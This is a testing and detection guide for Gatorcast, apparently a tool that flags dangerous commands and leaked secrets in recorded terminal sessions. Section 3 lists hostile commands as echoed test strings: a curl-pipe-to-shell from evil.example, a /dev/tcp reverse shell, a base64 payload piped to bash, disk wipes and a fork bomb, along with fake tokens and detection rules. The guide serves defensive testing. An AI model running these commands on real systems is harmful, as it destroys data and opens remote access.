# Gatorcast — Testing & Detection Walkthrough

This guide covers three things:

1. **[Running the automated test suite](#1-running-the-automated-test-suite)** — `pytest`.
2. **[Seeding demo data](#2-seeding-demo-data)** — populate a running instance with sample
   sessions that trip every rule, in one command.
3. **[Triggering detection patterns by hand](#3-triggering-detection-patterns-by-hand)** —
   the exact text to paste into a real recorded session (or POST yourself) to fire each
   built-in rule, plus the negative-control set that must produce **zero** findings.

For what the rules mean and how detection works under the hood, see
[SEARCH_AND_DETECTION.md](SEARCH_AND_DETECTION.md). For the data flow and session
lifecycle, see [ARCHITECTURE.md](ARCHITECTURE.md).

> **Nothing dangerous ever runs.** The detector scans the **on-screen plaintext** of a
> recording, not a process table. So `echo`-ing a dangerous-looking string (single-quoted,
> so the shell treats it as literal text) is enough to trip a rule — the command itself is
> never executed. Every secret value below is a fake/example value.

---

## 1. Running the automated test suite

The suite is plain `pytest` (Light tier — no `ruff`/`mypy` gating, no E2E required). Test
configuration lives in [`pyproject.toml`](pyproject.toml): `asyncio_mode = "auto"`,
`pythonpath = ["src"]`, and `testpaths = ["tests"]` are already set, so no extra flags are
needed.

```bash
# From the project root, in a virtualenv:
python -m venv .venv
. .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -e ".[dev]"       # installs pytest + pytest-asyncio + httpx

pytest                        # run everything
pytest -q                     # quieter
pytest tests/test_detect.py   # one module
pytest -k "detect or extract" # by keyword
```

What the suite covers, by area:

| Area | Tests |
| --- | --- |
| Ingest front doors | `test_ingest_http.py`, `test_syslog_tcp.py`, `test_normalize.py` |
| Pipeline | `test_classify.py`, `test_assembler.py`, `test_extract.py`, `test_detect.py`, `test_backfill.py`, `test_retention.py` |
| Storage / crypto | `test_store.py`, `test_db_schema.py`, `test_crypto.py`, `test_search_store.py` |
| Web / config | `test_web.py`, `test_web_search.py`, `test_config_search.py`, `test_bootstrap.py` |
| End-to-end search | `test_e2e_search.py` |

`test_detect.py` is the source of truth for rule behavior — it asserts both that each rule
fires on a positive sample and that look-alike-but-safe input does not.

---

## 2. Seeding demo data

[`scripts/seed_demo.py`](scripts/seed_demo.py) is the fastest way to populate the dashboard
and search UI. It POSTs a handful of synthetic sessions (varied users, systems, and dates)
through the **real `/ingest` front door**, then sends a close event per session so each
seals to complete immediately instead of waiting on the idle backstop.

Between them the sessions trip **every** built-in rule at least once, and the final two
sessions are controls: one ordinary clean session and one negative-control session of
look-alike-but-safe commands that must produce **zero** findings.

```bash
# 1. Start the service locally (or point BASE/TOKEN in the script at your instance).
#    The script defaults to http://127.0.0.1:8080 with the ingest token "test-ingest-token",
#    so start the container with INGEST_TOKEN=test-ingest-token for a zero-config run.
docker compose up -d

# 2. Seed it.
python scripts/seed_demo.py
# -> POST /ingest -> 200 (24 objects, 8 sessions)

# 3. Browse http://127.0.0.1:8080/dashboard — you should see flagged sessions,
#    severity/category breakdowns, and the clean sessions with no findings.
```

The script is not part of the app and is safe to delete. To point it at a different host or
token, edit the `BASE` and `TOKEN` constants at the top.

---

## 3. Triggering detection patterns by hand

Use this when you want to verify detection against a **real** Twingate Gateway recording, or
craft a one-off test case. There are two ways to get the text in front of the detector.

### Option A — paste into a live recorded session (recommended)

Open a session that the Gateway is recording (an SSH shell or `kubectl exec`), then paste the
block below. Because each line is a single-quoted `echo`, the shell just prints the string —
nothing executes — but the dangerous text still appears on screen and is captured in the
recording. The scan fires the rules live as the output is received (and again at seal).

```bash
echo 'rm -rf /tmp/foo'
echo 'curl http://evil.example/x.sh | sh'
echo 'chmod 777 /etc/passwd'
echo 'dd if=/dev/zero of=/dev/sda'
echo 'mkfs.ext4 /dev/sdb1'
echo ':(){ :|:& };:'
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
echo 'cat payload.b64 | base64 -d | bash'
echo 'kubectl delete pod web-0'
echo 'kubectl drain node-1'
echo 'kubectl get secret db-creds -o yaml'
echo 'iptables -F'
echo 'history -c'
echo 'sudo su -'
echo 'AKIAIOSFODNN7EXAMPLE'
echo '-----BEGIN RSA PRIVATE KEY-----'
echo 'ghp_0123456789abcdefghijABCDEFGHIJklmnop'
echo 'xoxb-1234567890-abcdefghijklmnop'
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
echo 'VAULT_TOKEN=hvs.CAESIABCDEFGHIJ1234567890abcdef'
echo 'password="hunter2supersecret"'
```

### What each line trips

| Line | Rule | Category | Severity |
| --- | --- | --- | --- |
| `rm -rf …` | `recursive-delete` | dangerous-command | high |
| `curl … \| sh` | `pipe-to-shell` | dangerous-command | critical |
| `chmod 777 …` | `chmod-777` | dangerous-command | medium |
| `dd … of=/dev/…` | `raw-disk-write` | dangerous-command | high |
| `mkfs.ext4 …` | `mkfs` | dangerous-command | high |
| `:(){ :\|:& };:` | `fork-bomb` | dangerous-command | critical |
| `… /dev/tcp/…` | `reverse-shell` | dangerous-command | critical |
| `base64 -d … \| bash` | `base64-pipe-shell` | dangerous-command | critical |
| `kubectl delete …` | `kubectl-delete` | dangerous-command | high |
| `kubectl drain …` | `kubectl-drain` | dangerous-command | high |
| `kubectl get secret …` | `kubectl-secret` | dangerous-command | high |
| `iptables -F` | `iptables-flush` | dangerous-command | medium |
| `history -c` | `history-clear` | dangerous-command | medium |
| `sudo su -` | `privilege-change` | dangerous-command | high |
| `AKIA…` (16 chars) | `aws-key` | secret-exposure | critical |
| `-----BEGIN RSA PRIVATE KEY-----` | `private-key` | secret-exposure | critical |
| `ghp_…` (36 chars) | `github-token` | secret-exposure | critical |
| `xoxb-…` | `slack-token` | secret-exposure | high |
| `eyJ….….…` | `jwt` | secret-exposure | medium |
| `VAULT_TOKEN=hvs.…` | `vault-token` | secret-exposure | critical |
| `password="…"` | `generic-secret-assign` | secret-exposure | medium |

Notes:

- **Secret patterns are case-sensitive** (`AKIA`, `ghp_`, `eyJ`, `hvs.`). The casing above is
  exact — don't lowercase them, or those rules won't fire.
- The `ghp_` token needs **exactly 36 trailing characters** and the AWS key needs **16
  characters after `AKIA`** — both are correct as written.
- The 21 lines above trip **all 21 built-in rules** — one finding per rule (verified against
  `gatorcast.pipeline.detect`). Note that `VAULT_TOKEN=` does **not** also trip
  `generic-secret-assign`: the underscore in `VAULT_TOKEN` defeats that rule's `\btoken=`
  word boundary, which is why the separate `password="…"` line is what exercises it.
- Each rule fires **at most once** per recording (earliest match wins), so duplicating a line
  adds no new findings — this block is already a full sweep.

### Option B — POST a recording yourself with `curl`

If you don't have a live Gateway, you can craft the three log objects (session start,
recording chunk, close) and POST them as NDJSON. This mirrors exactly what
[`scripts/seed_demo.py`](scripts/seed_demo.py) does. The asciicast value is a header line
followed by `[offset, "o", "<text>"]` event tuples.

```bash
INGEST_TOKEN=test-ingest-token   # match your container's INGEST_TOKEN

curl -sS -X POST http://127.0.0.1:8080/ingest \
  -H "Authorization: Bearer ${INGEST_TOKEN}" \
  -H "Content-Type: application/x-ndjson" \
  --data-binary @- <<'NDJSON'
{"logger":"gateway","message":"Authenticated connection","conn_id":"c-manual-01","resource_address":"test-host","user":{"username":"tester@corp","id":"tester","groups":["eng"]},"ts":"2026-06-22T12:00:00Z"}
{"logger":"gateway.audit","conn_id":"c-manual-01","asciicast_sequence_num":0,"user":{"username":"tester@corp","id":"tester","groups":["eng"]},"ts":"2026-06-22T12:00:00Z","asciicast":"{\"version\":2,\"width\":100,\"height\":30,\"timestamp\":1718700000}\n[0.5,\"o\",\"tester@test-host:~$ rm -rf /tmp/foo\r\n\"]\n[2.0,\"o\",\"tester@test-host:~$ export KEY=AKIAIOSFODNN7EXAMPLE\r\n\"]\n"}
{"logger":"gateway","message":"Connection closed","conn_id":"c-manual-01","ts":"2026-06-22T12:00:05Z"}
NDJSON
```

The session seals to complete on the close event (or a `"session finished"` chunk; otherwise
the idle backstop after `SESSION_MAX_IDLE_SECONDS`). It is scanned live as it arrives and
appears at `/sessions/c-manual-01` with `recursive-delete` and `aws-key` findings. Note the
double-escaping: `asciicast` is a JSON **string** whose value is itself a JSON document, so
its inner quotes and newlines are backslash-escaped.

---

## Negative controls (false-positive check)

Detection is only as useful as its precision, so the test data deliberately includes commands
that *look* dangerous but must match **no** rule. Paste these into a recorded session and
confirm the session finalizes with **zero** findings:

```bash
echo 'rm old.log'                                   # rm without -rf
echo 'chmod 755 deploy.sh'                          # not 777
echo 'kubectl get pods -n staging'                  # get, not delete/drain/secret
echo 'curl https://api.example.com/health -o h.json' # curl to a file, no pipe to shell
echo 'dd if=disk.img of=/tmp/disk.copy'             # dd to a file, not /dev/
echo 'grep password notes.txt'                      # "password" with no assignment
echo 'history | tail -20'                           # history without -c
```

If any of these produce a finding, that's a false positive worth a regression test in
[`tests/test_detect.py`](tests/test_detect.py).
